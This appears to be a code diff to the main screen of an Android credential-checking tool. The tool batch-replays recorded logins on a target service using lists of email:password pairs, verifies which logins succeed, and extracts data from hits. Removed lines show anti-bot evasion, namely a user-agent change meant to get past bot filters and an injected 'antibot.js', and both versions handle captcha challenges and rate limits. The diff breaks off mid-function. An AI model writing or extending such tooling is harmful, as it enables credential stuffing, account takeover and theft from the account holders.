@@ -40,10 +40,6 @@ import android.widget.ProgressBar;
 import android.widget.RelativeLayout;
 import android.widget.TextView;
 import android.widget.Toast;
-import android.os.SystemClock;
-import android.view.KeyEvent;
-import android.view.inputmethod.BaseInputConnection;
-import android.view.inputmethod.EditorInfo;
 
 import androidx.annotation.NonNull; /* ADDED */
 import androidx.appcompat.app.AlertDialog;
@@ -77,13 +73,6 @@ public class MainActivity extends AppCompatActivity implements ServiceSelectionM
     private WebView mWebView;
     private View overlayStealth;
 
-    // --- Visual Status Indicator ---
-    private FrameLayout visualStatusIndicator;
-    private LinearLayout visualRecordingOverlay;
-    private TextView visualStatusText;
-    private android.widget.ImageView visualFlashOverlay;
-    private android.widget.ImageView visualMappingBoxes;
-
     // --- Floating Overlay UI ---
     private FrameLayout overlayRoot;
     private CardView cardExpandedMenu;
@@ -97,8 +86,7 @@ public class MainActivity extends AppCompatActivity implements ServiceSelectionM
 
     // Buttons in Floating Menu
     private Button btnRecordStep1, btnRecordStep2;
-    private Button btnPlaySingle, btnExecuteBatch, btnStopBatch, btnCancelRecording, btnForceClick;
-    private Button btnForceClickArea;
+    private Button btnPlaySingle, btnExecuteBatch, btnStopBatch, btnCancelRecording;
     private Button btnSelectService, btnSessionResults, btnCredentials;
 
     // Draggable Logic
@@ -129,9 +117,6 @@ public class MainActivity extends AppCompatActivity implements ServiceSelectionM
 
     // Current Service
     private ServiceRepository serviceRepo;
-    private List<Text.TextBlock> mappedTextBlocks = new ArrayList<>();
-    private boolean isMappingComplete = false;
-    private int visualRecordingStep = 0; // 0 = Email, 1 = Password, 2 = Login Button
     private ServiceRepository.ServiceData currentService;
     private static final int REQUEST_CODE_IMPORT_JSON = 1001;
     private static final int REQUEST_CODE_IMPORT_CREDS = 1002;
@@ -210,14 +195,6 @@ public class MainActivity extends AppCompatActivity implements ServiceSelectionM
         setupFloatingOverlay();
         setupScannerUI();
 
-        // Check for dev mode recording
-        if (getIntent().getBooleanExtra("START_RECORDING_MODE", false)) {
-            // Un-hide record buttons for dev
-            if (btnRecordStep1 != null) btnRecordStep1.setVisibility(View.VISIBLE);
-            if (btnRecordStep2 != null) btnRecordStep2.setVisibility(View.VISIBLE);
-            Toast.makeText(this, "Developer Recording Mode Enabled", Toast.LENGTH_SHORT).show();
-        }
-
         // Handle Security Check
         if (securityManager.isBiometricEnabled()) {
              // Hide overlay initially
@@ -282,11 +259,6 @@ public class MainActivity extends AppCompatActivity implements ServiceSelectionM
     private void initViews() {
         mWebView = findViewById(R.id.activity_main_webview);
         overlayStealth = findViewById(R.id.overlay_stealth);
-        visualStatusIndicator = findViewById(R.id.visual_status_indicator);
-        visualRecordingOverlay = findViewById(R.id.visual_recording_overlay);
-        visualStatusText = findViewById(R.id.visual_status_text);
-        visualFlashOverlay = findViewById(R.id.visual_flash_overlay);
-        visualMappingBoxes = findViewById(R.id.visual_mapping_boxes);
 
         // Setup Stealth Mode Double Tap
         GestureDetector gd = new GestureDetector(this, new GestureDetector.SimpleOnGestureListener() {
@@ -357,8 +329,6 @@ public class MainActivity extends AppCompatActivity implements ServiceSelectionM
         btnCredentials = overlayView.findViewById(R.id.btn_credentials);
         btnStopBatch = overlayView.findViewById(R.id.btn_stop_batch);
         btnCancelRecording = overlayView.findViewById(R.id.btn_cancel_recording);
-        btnForceClick = overlayView.findViewById(R.id.btn_force_click);
-        btnForceClickArea = overlayView.findViewById(R.id.btn_force_click_area);
 
         // Setup Console Log
         consoleAdapter = new ConsoleLogAdapter();
@@ -403,19 +373,6 @@ public class MainActivity extends AppCompatActivity implements ServiceSelectionM
         btnCredentials.setOnClickListener(v -> { performHapticFeedback(); showCredentialsDialog(); });
         btnStopBatch.setOnClickListener(v -> { performHapticFeedback(); stopBatch(); });
         btnCancelRecording.setOnClickListener(v -> { performHapticFeedback(); cancelRecording(); });
-
-        btnForceClick.setOnClickListener(v -> {
-            performHapticFeedback();
-            mWebView.evaluateJavascript("javascript:window.enableForceClickMode();", null);
-            Toast.makeText(this, "Tap the screen to record a Force Click.", Toast.LENGTH_SHORT).show();
-        });
-
-        btnForceClickArea.setOnClickListener(v -> {
-            performHapticFeedback();
-            // Start force click area selection mode in javascript
-            mWebView.evaluateJavascript("javascript:window.enableForceAreaSelectionMode();", null);
-            Toast.makeText(this, "Tap the screen to designate a Force Click Area.", Toast.LENGTH_SHORT).show();
-        });
 
         updateTerminal("System Ready.");
     }
@@ -771,20 +728,16 @@ public class MainActivity extends AppCompatActivity implements ServiceSelectionM
         if (currentService == null) return;
 
         new AlertDialog.Builder(this)
-                .setTitle("Visual Recording")
-                .setMessage("1. Wait for the yellow indicator to turn green.\n2. Tap the fields and buttons in order.\n3. Click STOP RECORDING when finished.")
+                .setTitle("Record Actions")
+                .setMessage("Use any dummy details (or real ones) to show the app where to type email and password.\n\nClick STOP after you click the login button.")
                 .setPositiveButton("Start", (d, w) -> {
                     // Reset session
                     currentSessionEvents.clear();
-                    isMappingComplete = false;
-                    visualRecordingStep = 0;
-                    mappedTextBlocks.clear();
-
                     recordingStartTime = System.currentTimeMillis();
                     recordingMode = RECORD_MODE_DUMMY;
                     recordingStartUrl = currentService.getLoginUrl();
 
-                    updateTerminal("Starting Visual Recording...");
+                    updateTerminal("Recording Actions...");
 
                     // Toggle Buttons
                     btnRecordStep1.setVisibility(View.GONE);
@@ -793,8 +746,6 @@ public class MainActivity extends AppCompatActivity implements ServiceSelectionM
                     btnStopBatch.setText("STOP RECORDING");
                     btnStopBatch.setOnClickListener(v -> stopRecording());
                     btnCancelRecording.setVisibility(View.VISIBLE);
-                    btnForceClick.setVisibility(View.GONE); // Visual mode does not need force click
-                    if (btnForceClickArea != null) btnForceClickArea.setVisibility(View.GONE);
 
                     android.webkit.CookieManager.getInstance().removeAllCookies(null);
                     mWebView.loadUrl(recordingStartUrl);
@@ -1025,39 +976,9 @@ public class MainActivity extends AppCompatActivity implements ServiceSelectionM
         }
     }
 
-
-    private void clearCookiesAndCache() {
-        mWebView.clearCache(true);
-        mWebView.clearHistory();
-        mWebView.clearFormData();
-
-        android.webkit.CookieManager cookieManager = android.webkit.CookieManager.getInstance();
-        cookieManager.removeAllCookies(null);
-        cookieManager.flush();
-
-        android.webkit.WebStorage.getInstance().deleteAllData();
-    }
-private void setupWebView() {
+    private void setupWebView() {
         applyProxySettings();
         WebSettings webSettings = mWebView.getSettings();
-
-        mWebView.setOnTouchListener((v, event) -> {
-            if (recordingMode == RECORD_MODE_DUMMY && isMappingComplete && event.getAction() == MotionEvent.ACTION_UP) {
-                handleVisualRecordingTap(event.getX(), event.getY());
-            }
-            return false;
-        });
-
-        // AI Stealth Enhancements
-        webSettings.setDomStorageEnabled(true);
-        webSettings.setDatabaseEnabled(true);
-        webSettings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
-        webSettings.setMediaPlaybackRequiresUserGesture(false);
-        webSettings.setCacheMode(WebSettings.LOAD_NO_CACHE);
-        // Randomize User Agent slightly to bypass generic bot filters
-        String defaultAgent = WebSettings.getDefaultUserAgent(this);
-        webSettings.setUserAgentString(defaultAgent + " (Mobile; D-Tech; rv:109.0) Gecko/109.0");
-
         webSettings.setJavaScriptEnabled(true);
         webSettings.setAllowFileAccess(true);
         webSettings.setAllowContentAccess(true);
@@ -1065,27 +986,6 @@ private void setupWebView() {
         webSettings.setDatabaseEnabled(true);
 
         mWebView.addJavascriptInterface(new WebAppInterface(this), "Android");
-
-        // Set WebChromeClient to auto-handle native popups
-        mWebView.setWebChromeClient(new android.webkit.WebChromeClient() {
-            @Override
-            public boolean onJsAlert(WebView view, String url, String message, android.webkit.JsResult result) {
-                result.confirm();
-                return true;
-            }
-
-            @Override
-            public boolean onJsConfirm(WebView view, String url, String message, android.webkit.JsResult result) {
-                result.confirm();
-                return true;
-            }
-
-            @Override
-            public boolean onJsPrompt(WebView view, String url, String message, String defaultValue, android.webkit.JsPromptResult result) {
-                result.confirm(defaultValue);
-                return true;
-            }
-        });
 
         mWebView.setWebViewClient(new WebViewClient() {
             @Override
@@ -1097,158 +997,23 @@ private void setupWebView() {
             @Override
             public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) { return false; }
 
-
             @Override
-            public void onPageStarted(WebView view, String url, Bitmap favicon) {
-                super.onPageStarted(view, url, favicon);
-                try {
-                    java.io.InputStream is = getAssets().open("antibot.js");
-                    int size = is.available();
-                    byte[] buffer = new byte[size];
-                    is.read(buffer);
-                    is.close();
-                    String script = new String(buffer, "UTF-8");
-                    view.evaluateJavascript(script, null);
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            }
-        public void onPageFinished(WebView view, String url) {
+            public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
 
                 if (isWaitingForNext) return;
 
-                if (recordingMode == RECORD_MODE_DUMMY && !isMappingComplete) {
-                     performVisualMapping();
+                if (recordingMode != RECORD_MODE_NONE) {
+                    injectRecorder();
                 } else if (isReplaying) {
                      if (isBatchRunning) {
-                         mWebView.postDelayed(() -> performVisualReplay(), 1500);
+                         mWebView.postDelayed(() -> injectReplayer(), 1500);
                      } else {
-                         performVisualReplay();
+                         injectReplayer();
                      }
                 }
             }
         });
-    }
-
-    private void performVisualMapping() {
-        runOnUiThread(() -> {
-            visualRecordingOverlay.setVisibility(View.VISIBLE);
-            visualStatusIndicator.setBackgroundResource(R.drawable.circle_yellow);
-            visualStatusText.setText("Capturing Screen...");
-
-            // Allow page to settle
-            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                try {
-                    // Flash screen effect
-                    visualFlashOverlay.setBackgroundColor(Color.WHITE);
-                    visualFlashOverlay.setVisibility(View.VISIBLE);
-                    visualFlashOverlay.setAlpha(0.8f);
-                    visualFlashOverlay.animate().alpha(0f).setDuration(300).withEndAction(() -> visualFlashOverlay.setVisibility(View.GONE)).start();
-
-                    android.graphics.Bitmap bitmap = android.graphics.Bitmap.createBitmap(mWebView.getWidth(), mWebView.getHeight(), android.graphics.Bitmap.Config.ARGB_8888);
-                    android.graphics.Canvas canvas = new android.graphics.Canvas(bitmap);
-                    mWebView.draw(canvas);
-
-                    visualStatusText.setText("Mapping Screen...");
-
-                    InputImage image = InputImage.fromBitmap(bitmap, 0);
-                    TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS)
-                        .process(image)
-                        .addOnSuccessListener(visionText -> {
-                            mappedTextBlocks = visionText.getTextBlocks();
-                            isMappingComplete = true;
-                            visualStatusIndicator.setBackgroundResource(R.drawable.circle_green);
-                            visualStatusText.setText("Ready: Tap Email Field");
-
-                            // Draw bounding boxes
-                            android.graphics.Bitmap boxBitmap = android.graphics.Bitmap.createBitmap(mWebView.getWidth(), mWebView.getHeight(), android.graphics.Bitmap.Config.ARGB_8888);
-                            android.graphics.Canvas boxCanvas = new android.graphics.Canvas(boxBitmap);
-                            android.graphics.Paint paint = new android.graphics.Paint();
-                            paint.setColor(Color.GREEN);
-                            paint.setStyle(android.graphics.Paint.Style.STROKE);
-                            paint.setStrokeWidth(3f);
-                            for (com.google.mlkit.vision.text.Text.TextBlock block : mappedTextBlocks) {
-                                if (block.getBoundingBox() != null) {
-                                    boxCanvas.drawRect(block.getBoundingBox(), paint);
-                                }
-                            }
-                            visualMappingBoxes.setImageBitmap(boxBitmap);
-                            visualMappingBoxes.setVisibility(View.VISIBLE);
-
-                            Toast.makeText(this, "Visual Mapping Complete. Tap the Email field.", Toast.LENGTH_SHORT).show();
-                        })
-                        .addOnFailureListener(e -> {
-                            visualStatusText.setText("Mapping Failed.");
-                            Toast.makeText(this, "Visual Mapping Failed. Cannot record.", Toast.LENGTH_SHORT).show();
-                            cancelRecording();
-                        });
-                } catch (Exception e) {
-                    Log.e(TAG, "Mapping Snapshot Failed", e);
-                    visualStatusText.setText("Mapping Error.");
-                }
-            }, 2000);
-        });
-    }
-
-    private void handleVisualRecordingTap(float x, float y) {
-        if (mappedTextBlocks == null || mappedTextBlocks.isEmpty()) return;
-
-        float viewWidth = mWebView.getWidth();
-        float viewHeight = mWebView.getHeight();
-
-        // Find nearest text block
-        Text.TextBlock nearestBlock = null;
-        float minDistance = Float.MAX_VALUE;
-
-        for (Text.TextBlock block : mappedTextBlocks) {
-            android.graphics.Rect rect = block.getBoundingBox();
-            if (rect != null) {
-                float blockCenterX = rect.centerX();
-                float blockCenterY = rect.centerY();
-                float dist = (float) Math.hypot(blockCenterX - x, blockCenterY - y);
-                if (dist < minDistance) {
-                    minDistance = dist;
-                    nearestBlock = block;
-                }
-            }
-        }
-
-        if (nearestBlock != null) {
-            android.graphics.Rect rect = nearestBlock.getBoundingBox();
-            if (rect != null) {
-                // Calculate offset as percentages
-                float offsetX = x - rect.centerX();
-                float offsetY = y - rect.centerY();
-                float pctOffsetX = offsetX / viewWidth;
-                float pctOffsetY = offsetY / viewHeight;
-
-                try {
-                    JSONObject action = new JSONObject();
-                    action.put("step", visualRecordingStep);
-                    action.put("anchorText", nearestBlock.getText());
-                    action.put("pctOffsetX", pctOffsetX);
-                    action.put("pctOffsetY", pctOffsetY);
-
-                    currentSessionEvents.add(action);
-
-                    // Flash screen green on tap
-                    runOnUiThread(() -> {
-                        visualFlashOverlay.setBackgroundColor(Color.GREEN);
-                        visualFlashOverlay.setVisibility(View.VISIBLE);
-                        visualFlashOverlay.setAlpha(0.6f);
-                        visualFlashOverlay.animate().alpha(0f).setDuration(200).withEndAction(() -> visualFlashOverlay.setVisibility(View.GONE)).start();
-                    });
-
-                    String actionName = "Action " + (visualRecordingStep + 1);
-                    visualRecordingStep++;
-                    runOnUiThread(() -> visualStatusText.setText("Ready: Tap next field/button or click STOP"));
-                    Toast.makeText(MainActivity.this, actionName + " recorded. Tap next field/button or STOP.", Toast.LENGTH_SHORT).show();
-                } catch (JSONException e) {
-                    e.printStackTrace();
-                }
-            }
-        }
     }
 
     // --- Recording Logic ---
@@ -1277,8 +1042,6 @@ private void setupWebView() {
                 btnStopBatch.setText("STOP RECORDING");
                 btnStopBatch.setOnClickListener(v -> stopRecording());
                 btnCancelRecording.setVisibility(View.VISIBLE);
-                btnForceClick.setVisibility(View.VISIBLE);
-                if (btnForceClickArea != null) btnForceClickArea.setVisibility(View.VISIBLE);
 
                 mWebView.loadUrl(recordingStartUrl);
             })
@@ -1352,8 +1115,6 @@ private void setupWebView() {
         btnStopBatch.setText("STOP BATCH EXECUTION");
         btnStopBatch.setOnClickListener(v -> stopBatch());
         btnCancelRecording.setVisibility(View.GONE);
-        btnForceClick.setVisibility(View.GONE);
-        if (btnForceClickArea != null) btnForceClickArea.setVisibility(View.GONE);
     }
 
     private void openScannerOverlay() {
@@ -1401,8 +1162,6 @@ private void setupWebView() {
                 btnStopBatch.setText("STOP RECORDING");
                 btnStopBatch.setOnClickListener(v -> stopRecording());
                 btnCancelRecording.setVisibility(View.VISIBLE);
-                btnForceClick.setVisibility(View.VISIBLE);
-                if (btnForceClickArea != null) btnForceClickArea.setVisibility(View.VISIBLE);
 
                  android.webkit.CookieManager.getInstance().removeAllCookies(null);
                  android.webkit.WebStorage.getInstance().deleteAllData();
@@ -1423,8 +1182,6 @@ private void setupWebView() {
 
         // Reset UI
         resetOverlayButtons();
-        visualRecordingOverlay.setVisibility(View.GONE);
-        visualMappingBoxes.setVisibility(View.GONE);
 
         // Inform JS to stop recording
         mWebView.evaluateJavascript("javascript:window.isRecording = false;", null);
@@ -1435,14 +1192,9 @@ private void setupWebView() {
     private void stopRecording() {
         if (recordingMode == RECORD_MODE_NONE) return;
 
-        // Hide visual indicator
-        visualRecordingOverlay.setVisibility(View.GONE);
-        visualMappingBoxes.setVisibility(View.GONE);
-
         if (recordingMode == RECORD_MODE_DUMMY) {
             JSONArray arr = new JSONArray(currentSessionEvents);
             currentService.setScriptJson(arr.toString());
-            currentService.setVisual(true);
             currentService.setSuccessUrl("");
             currentService.setSuccessSelector(null);
             currentService.setSuccessKeywords(new ArrayList<>());
@@ -1780,7 +1532,6 @@ private void setupWebView() {
 
         resetOverlayButtons();
         progressBatch.setVisibility(View.GONE);
-        visualStatusIndicator.setVisibility(View.GONE);
 
         updateTerminal("Batch Stopped.");
         showCustomSnackbar("Batch Stopped", true);
@@ -1823,8 +1574,7 @@ private void setupWebView() {
         String currentPair = credentialList.get(currentCredentialIndex);
 
         updateTerminal("Processing: " + currentPair.split(":")[0]);
-
-
+        // tvDeckCount.setText((currentCredentialIndex + 1) + "/" + credentialList.size()); // Removed old UI
 
         final int targetIndex = currentCredentialIndex;
 
@@ -1835,197 +1585,55 @@ private void setupWebView() {
             batchHandler.postDelayed(() -> {
                  if (!isBatchRunning || targetIndex != currentCredentialIndex) return;
                  isWaitingForNext = false;
-                 isReplaying = true;
-
-
+                 replayStartTime = System.currentTimeMillis();
+                 lastExecutedIndex = -1;
 
                  mWebView.loadUrl(currentService.getLoginUrl());
-
-                 // Start visual action chain and start success checks
-
-                 performVisualReplay(); // starts the success verifier loop
-
             }, 1000);
         });
     }
 
-    private void performVisualReplay() {
+    private void injectRecorder() {
+        String js = readAssetFile("recorder.js");
+        String setup = "window.recordingStartTime = " + recordingStartTime + ";";
+        mWebView.evaluateJavascript(setup + js, null);
+    }
+
+    private void injectReplayer() {
         if (!isReplaying) return;
+        String js = readAssetFile("replayer.js");
+        verificationAttempts = 0;
 
-        runOnUiThread(() -> {
-            visualStatusIndicator.setVisibility(View.VISIBLE);
-            visualStatusIndicator.setBackgroundResource(R.drawable.circle_yellow);
-
-            // Wait for load to settle
-            batchHandler.postDelayed(() -> {
-                if (!isBatchRunning || currentCredentialIndex >= credentialList.size()) return;
-
-                try {
-                    android.graphics.Bitmap bitmap = android.graphics.Bitmap.createBitmap(mWebView.getWidth(), mWebView.getHeight(), android.graphics.Bitmap.Config.ARGB_8888);
-                    android.graphics.Canvas canvas = new android.graphics.Canvas(bitmap);
-                    mWebView.draw(canvas);
-
-                    InputImage image = InputImage.fromBitmap(bitmap, 0);
-                    TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS)
-                        .process(image)
-                        .addOnSuccessListener(visionText -> {
-                            mappedTextBlocks = visionText.getTextBlocks();
-                            visualStatusIndicator.setBackgroundResource(R.drawable.circle_green);
-                            executeVisualSteps(0);
-                        })
-                        .addOnFailureListener(e -> {
-                            updateTerminal("Replay Mapping Failed.");
-                            logResult(false, "Mapping Error", currentCredentialIndex);
-                            moveToNext(currentCredentialIndex);
-                        });
-                } catch (Exception e) {
-                    Log.e(TAG, "Replay Snapshot Failed", e);
-                    moveToNext(currentCredentialIndex);
-                }
-            }, 3000);
-        });
-    }
-
-    private void executeVisualSteps(int stepIndex) {
-        if (!isBatchRunning || currentSessionEvents.isEmpty() || stepIndex >= currentSessionEvents.size()) {
-            if (stepIndex >= currentSessionEvents.size()) {
-                // Steps finished, begin validation loop
-                verificationAttempts = 0;
-                final int targetIndex = currentCredentialIndex;
-                verificationRunnable = () -> checkVerificationStatus(targetIndex);
-                batchHandler.postDelayed(verificationRunnable, 3000);
-            }
-            return;
+        String email = "";
+        String pass = "";
+        if (isBatchRunning && currentCredentialIndex < credentialList.size()) {
+            String[] parts = credentialList.get(currentCredentialIndex).split(":", 2);
+            if (parts.length > 0) email = parts[0].trim();
+            if (parts.length > 1) pass = parts[1].trim();
         }
 
+        JSONArray jsonArray = new JSONArray(currentSessionEvents);
+        JSONObject overrides = new JSONObject();
         try {
-            JSONObject action = currentSessionEvents.get(stepIndex);
-            String anchorText = action.getString("anchorText");
-            float pctOffsetX = (float) action.getDouble("pctOffsetX");
-            float pctOffsetY = (float) action.getDouble("pctOffsetY");
+            overrides.put("email", email);
+            overrides.put("password", pass);
+        } catch (JSONException e) {}
 
-            // Find anchor on current screen
-            Text.TextBlock matchedBlock = null;
-            if (mappedTextBlocks != null) {
-                String targetAnchor = anchorText.trim().toLowerCase();
-                String targetAlphaNum = targetAnchor.replaceAll("[^a-z0-9]", "");
+        String setup = "window.replayEvents = " + jsonArray.toString() + "; " +
+                       "window.replayStartTime = " + replayStartTime + "; " +
+                       "window.lastExecutedIndex = " + lastExecutedIndex + "; " +
+                       "var overrides = " + overrides.toString() + "; " +
+                       "window.overrideEmail = overrides.email; " +
+                       "window.overridePassword = overrides.password;" +
+                       "window.coordinateMode = " + useCoordinateMode + ";";
 
-                // Tier 1: Exact case-insensitive match
-                for (Text.TextBlock block : mappedTextBlocks) {
-                    if (block.getText().trim().equalsIgnoreCase(anchorText.trim())) {
-                        matchedBlock = block;
-                        break;
-                    }
-                }
+        updateTerminal("Testing: " + email);
+        mWebView.evaluateJavascript(setup + js, null);
 
-                // Tier 2: Alphanumeric match
-                if (matchedBlock == null && !targetAlphaNum.isEmpty()) {
-                    for (Text.TextBlock block : mappedTextBlocks) {
-                        String blockAlphaNum = block.getText().toLowerCase().replaceAll("[^a-z0-9]", "");
-                        if (blockAlphaNum.equals(targetAlphaNum)) {
-                            matchedBlock = block;
-                            break;
-                        }
-                    }
-                }
-
-                // Tier 3: Substring match
-                if (matchedBlock == null && targetAnchor.length() >= 3) {
-                    for (Text.TextBlock block : mappedTextBlocks) {
-                        String blockText = block.getText().trim().toLowerCase();
-                        if (blockText.contains(targetAnchor) || (blockText.length() >= 4 && targetAnchor.contains(blockText))) {
-                            matchedBlock = block;
-                            break;
-                        }
-                    }
-                }
-
-                // Tier 4: Levenshtein distance match
-                if (matchedBlock == null && targetAnchor.length() >= 4) {
-                    int bestDistance = Integer.MAX_VALUE;
-                    Text.TextBlock bestBlock = null;
-                    for (Text.TextBlock block : mappedTextBlocks) {
-                        String blockText = block.getText().trim().toLowerCase();
-                        int distance = calculateLevenshteinDistance(targetAnchor, blockText);
-                        int maxAllowedDistance = Math.max(1, targetAnchor.length() / 4); // 1 typo for 4 chars, 2 for 8 chars
-                        if (distance <= maxAllowedDistance && distance < bestDistance) {
-                            bestDistance = distance;
-                            bestBlock = block;
-                        }
-                    }
-                    if (bestBlock != null) {
-                        matchedBlock = bestBlock;
-                    }
-                }
-            }
-
-            if (matchedBlock != null && matchedBlock.getBoundingBox() != null) {
-                android.graphics.Rect rect = matchedBlock.getBoundingBox();
-                float targetX = rect.centerX() + (pctOffsetX * mWebView.getWidth());
-                float targetY = rect.centerY() + (pctOffsetY * mWebView.getHeight());
-
-                // Ensure target is within bounds
-                targetX = Math.max(0, Math.min(targetX, mWebView.getWidth() - 1));
-                targetY = Math.max(0, Math.min(targetY, mWebView.getHeight() - 1));
-
-                // Dispatch native touch
-                long downTime = SystemClock.uptimeMillis();
-                long eventTime = SystemClock.uptimeMillis();
-
-                MotionEvent downEvent = MotionEvent.obtain(downTime, eventTime, MotionEvent.ACTION_DOWN, targetX, targetY, 0);
-                mWebView.dispatchTouchEvent(downEvent);
-
-                MotionEvent upEvent = MotionEvent.obtain(downTime, eventTime + 50, MotionEvent.ACTION_UP, targetX, targetY, 0);
-                mWebView.dispatchTouchEvent(upEvent);
-
-                downEvent.recycle();
-                upEvent.recycle();
-
-                // If it's an input field (step 0 or 1), inject text natively
-                if (stepIndex == 0 || stepIndex == 1) {
-                    batchHandler.postDelayed(() -> {
-                        String credential = credentialList.get(currentCredentialIndex);
-                        String[] parts = credential.split(":");
-                        String textToInject = (stepIndex == 0) ? parts[0] : (parts.length > 1 ? parts[1] : "");
-
-                        BaseInputConnection connection = new BaseInputConnection(mWebView, true);
-                        connection.commitText(textToInject, 1);
-
-                        // Increased delay before next step to allow UI updates
-                        batchHandler.postDelayed(() -> executeVisualSteps(stepIndex + 1), 2000);
-                    }, 1000); // Wait longer for focus
-                } else {
-                    // It was a click, proceed to next with an increased delay
-                    batchHandler.postDelayed(() -> executeVisualSteps(stepIndex + 1), 2000);
-                }
-
-            } else {
-                updateTerminal("Anchor not found: " + anchorText);
-                logResult(false, "Anchor Missing", currentCredentialIndex);
-                moveToNext(currentCredentialIndex);
-            }
-
-        } catch (JSONException e) {
-            e.printStackTrace();
-            moveToNext(currentCredentialIndex);
-        }
-    }
-
-    private int calculateLevenshteinDistance(String a, String b) {
-        int[][] dp = new int[a.length() + 1][b.length() + 1];
-        for (int i = 0; i <= a.length(); i++) dp[i][0] = i;
-        for (int j = 0; j <= b.length(); j++) dp[0][j] = j;
-
-        for (int i = 1; i <= a.length(); i++) {
-            for (int j = 1; j <= b.length(); j++) {
-                int cost = (a.charAt(i - 1) == b.charAt(j - 1)) ? 0 : 1;
-                dp[i][j] = Math.min(
-                    Math.min(dp[i - 1][j] + 1, dp[i][j - 1] + 1),
-                    dp[i - 1][j - 1] + cost
-                );
-            }
-        }
-        return dp[a.length()][b.length()];
+        final int targetIndex = currentCredentialIndex;
+        // Start verification
+        verificationRunnable = () -> checkVerificationStatus(targetIndex);
+        batchHandler.postDelayed(verificationRunnable, 2000);
     }
 
     private void checkVerificationStatus(int targetIndex) {
@@ -2061,72 +1669,128 @@ private void setupWebView() {
             }
         }
 
-        // Method B: Text/Click-based verification (Native OCR)
-        // Take a full page screenshot and check text
-        performOcr(0, 0, 1, 1, text -> {
-             if (!isBatchRunning || targetIndex != currentCredentialIndex) return;
+        // Method B: Text/Click-based verification (OCR/JS)
+        if (currentService.isUseOcrForSuccess()) {
+             performOcr(0, 0, 1, 1, text -> {
+                 if (!isBatchRunning || targetIndex != currentCredentialIndex) return;
 
-             String fullTextLower = text.toLowerCase();
+                 boolean verified = false;
+                 List<String> keywords = currentService.getSuccessKeywords();
+                 String fullTextLower = text.toLowerCase();
 
-             // Challenge check
-             if (fullTextLower.contains("challenge") || fullTextLower.contains("cloudflare") || fullTextLower.contains("verify you are human")) {
-                 handleChallenge(targetIndex);
-                 return;
-             }
-
-             // Rate limit check
-             if ((fullTextLower.contains("limit") && fullTextLower.contains("reached")) || fullTextLower.contains("too many requests") || fullTextLower.contains("try again later")) {
-                 handleRateLimit();
-                 return;
-             }
-
-             // Failure check
-             List<String> failKeywords = currentService.getFailureKeywords();
-             if (failKeywords != null && !failKeywords.isEmpty()) {
-                 for (String key : failKeywords) {
-                     if (fullTextLower.contains(key.toLowerCase())) {
-                         logResult(false, "Failure keyword found: " + key, targetIndex);
-                         moveToNext(targetIndex);
-                         return;
-                     }
-                 }
-             }
-
-             // Success check via keywords
-             boolean verified = false;
-             List<String> keywords = currentService.getSuccessKeywords();
-             if (keywords != null && !keywords.isEmpty()) {
                  for (String key : keywords) {
                      if (fullTextLower.contains(key.toLowerCase())) {
                          verified = true;
                          break;
                      }
                  }
-             }
 
-             if (verified) {
-                  performBatchExtraction(targetIndex, " | Validated by Native OCR", 0, false);
-             } else {
-                 // Check if it's a generic failure
-                 if (fullTextLower.contains("incorrect") || ((fullTextLower.contains("email") || fullTextLower.contains("password")) && (fullTextLower.contains("invalid") || fullTextLower.contains("error")))) {
-                     logResult(false, "Login error detected", targetIndex);
-                     moveToNext(targetIndex);
-                     return;
+                 if (verified) {
+                      performBatchExtraction(targetIndex, " | Validated by Smart OCR", 0, false);
+                 } else {
+                      runJsVerification(targetIndex);
                  }
+             });
+             return;
+        }
 
-                 // Fallback URL change logic (Dummy mode)
-                 String loginUrl = currentService.getLoginUrl();
-                 String currentUrl = mWebView.getUrl();
-                 if (loginUrl != null && currentUrl != null && !currentUrl.equalsIgnoreCase(loginUrl)) {
-                     performBatchExtraction(targetIndex, " | Validated by URL Change", 0, false);
-                     return;
+        if (currentService.getSuccessOcrText() != null && !currentService.getSuccessOcrText().isEmpty()) {
+            performOcr(currentService.getSuccessOcrX(), currentService.getSuccessOcrY(),
+                       currentService.getSuccessOcrW(), currentService.getSuccessOcrH(), text -> {
+
+                if (!isBatchRunning || targetIndex != currentCredentialIndex) return;
+
+                String expected = currentService.getSuccessOcrText().toLowerCase();
+                String actual = text.toLowerCase();
+
+                if (actual.contains(expected) || (expected.length() > 5 && actual.contains(expected.substring(0, 5)))) {
+                    performBatchExtraction(targetIndex, " | Validated by OCR", 0, false);
+                } else {
+                     runJsVerification(targetIndex);
+                }
+            });
+        } else {
+             runJsVerification(targetIndex);
+        }
+    }
+
+    private void runJsVerification(int targetIndex) {
+        String js = readAssetFile("verifier.js");
+
+        String loginUrl = currentService.getLoginUrl();
+        String successUrl = currentService.getSuccessUrl() != null ? currentService.getSuccessUrl() : "";
+        List<String> keywords = currentService.getFailureKeywords();
+        JSONArray kwJson = new JSONArray();
+        if (keywords != null) for(String k : keywords) kwJson.put(k);
+
+        String successSelector = currentService.getSuccessSelector() != null ? currentService.getSuccessSelector() : "";
+        String safeSelector = successSelector.replace("'", "\\'");
+
+        List<String> successKeywords = currentService.getSuccessKeywords();
+        JSONArray skwJson = new JSONArray();
+        if (successKeywords != null) for(String k : successKeywords) skwJson.put(k);
+
+        List<ServiceRepository.ExtractionPoint> extractionPoints = currentService.getExtractionPoints();
+        JSONArray epJson = new JSONArray();
+        if (extractionPoints != null) {
+            for (ServiceRepository.ExtractionPoint ep : extractionPoints) {
+                try { epJson.put(ep.toJson()); } catch (JSONException e) {}
+            }
+        }
+
+        String injection = "window.loginUrl = '" + loginUrl + "'; " +
+                           "window.targetSuccessUrl = '" + successUrl + "'; " +
+                           "window.successSelector = '" + safeSelector + "'; " +
+                           "window.successKeywords = " + skwJson.toString() + "; " +
+                           "window.failureKeywords = " + kwJson.toString() + "; " +
+                           "window.extractionPoints = " + epJson.toString() + ";";
+
+        mWebView.evaluateJavascript(injection + js, value -> {
+            if (!isBatchRunning || targetIndex != currentCredentialIndex) return;
+
+            if (value != null && value.length() > 2) {
+                 String jsonStr = value;
+                 if (jsonStr.startsWith("\"") && jsonStr.endsWith("\"")) {
+                     jsonStr = jsonStr.substring(1, jsonStr.length() - 1).replace("\\\"", "\"");
                  }
+                 try {
+                     JSONObject res = new JSONObject(jsonStr);
+                     String status = res.getString("status");
 
-                 // Pending, loop again
